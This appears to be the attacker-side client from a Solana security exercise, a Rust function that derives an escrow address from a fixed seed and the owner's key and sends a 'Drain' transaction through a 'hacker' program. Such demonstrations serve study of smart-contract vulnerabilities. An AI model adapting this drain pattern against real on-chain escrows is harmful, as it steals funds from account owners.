use std::ops::Deref;
use anyhow::Result;
use anchor_client::{ Client, anchor_lang::system_program };
use solana_sdk::{ signer::Signer, pubkey::Pubkey };

use hacker::accounts as hacker_accounts;
use hacker::instruction as hacker_instruction;

const SEED: &[u8] = b"seed";

pub fn hacker_program<C: Deref<Target = impl Signer> + Clone>(
    client: &Client<C>,
    hacker: Pubkey,
    pda_owner: Pubkey,
    program_id: Pubkey,
    pda_program_id: Pubkey
) -> Result<()> {
    let program = client.program(program_id);
    let seed_signers = &[SEED, pda_owner.as_ref()];
    let (escrow_account, _) = Pubkey::find_program_address(seed_signers, &pda_program_id);
    // Build and send a transaction.
    let signature = program
        .request()
        .accounts(hacker_accounts::Drain {
            escrow_account: escrow_account,
            owner: pda_owner,
            hacker: hacker,
            system_program: system_program::ID,
        })
        .args(hacker_instruction::Drain {})
        .send();

    println!("hacker: {:?}", signature);

    Ok(())
}